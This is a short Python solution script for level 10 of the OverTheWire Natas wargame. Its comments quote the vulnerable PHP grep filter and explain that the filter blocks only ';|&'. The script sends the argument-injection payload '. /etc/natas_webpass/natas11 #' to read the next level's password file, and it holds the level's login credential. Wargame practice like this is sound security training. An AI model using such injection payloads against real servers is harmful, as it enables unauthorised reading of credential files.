#!/usr/bin/env python

#using requests module for python, not sure if I will need to install anything for this?
import requests
import re

username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'
url = 'http://%s.natas.labs.overthewire.org/' % username
#print(url) #make sure the URL works fine

#so same as last time except they claim to be filtering certain characters
#index-source.html shows the characters to be '/[;|&]/'
#so passing ". /etc/natas_webpass/natas10 #" will still work?
#OK OK OK so what confused me was the formatting of the php
#in php that formatting is not including / as part of the 'not allowed' set
#so totally we can still apply the last solution to this one

#heres' the php function
#<?
#$key = "";
#if(array_key_exists("needle", $_REQUEST)) {
#    $key = $_REQUEST["needle"];
#}
#if($key != "") {
#    if(preg_match('/[;|&]/',$key)) {
#        print "Input contains an illegal character!";
#    } else {
#        passthru("grep -i $key dictionary.txt");
#    }
#}
#?>

session = requests.Session()

response = requests.post(url, data = {"needle": ". /etc/natas_webpass/natas11 #", "submit" : "submit"}, auth = (username, password))
content = response.text


######################
#print(content)

#classic regexing
print(re.findall('Output:\n<pre>\n(.*)\n</pre>', content))

"""SDG"""